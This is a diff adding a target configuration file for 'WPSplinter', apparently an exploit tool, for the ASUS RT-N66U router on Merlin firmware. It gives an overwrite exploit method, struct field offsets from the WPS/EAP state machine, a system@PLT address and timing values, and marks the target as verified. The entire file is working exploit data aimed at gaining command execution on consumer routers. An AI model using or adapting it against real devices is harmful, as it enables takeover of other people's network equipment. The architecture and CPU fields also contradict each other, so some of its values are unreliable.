@@ -1,0 +1,35 @@
+# WPSplinter Configuration: ASUS RT-N66U (Merlin)
+# Generated: 2026-11-05
+
+manufacturer: "ASUS"
+model: "RT-N66U"
+firmware: "Merlin 3.004.478"
+architecture: "arm"
+cpu: "BCM5354"
+endianness: "little"
+exploit_method: "send_data_overwrite"
+verified: true
+
+offsets:
+  frags_received: 0x0000
+  total_bytes_to_recv: 0x0800
+  total_received: 0x0804
+  next_frag_to_send: 0x0808
+  frag_size: 0x080C
+  flags: 0x0818
+  last_sent: 0x081C
+  last_sent_len: 0x0820
+  send_data: 0x0838
+
+plt_addresses:
+  system: 0x27683
+
+timing:
+  calibrate_delay: 0.3
+  frag_ack_timeout: 3.0
+  resend_timer: 5.0
+
+notes:
+  - "Source code verified"
+  - "Offsets calculated from ap_eap_sm.h"
+  - "system@PLT from Ghidra analysis"
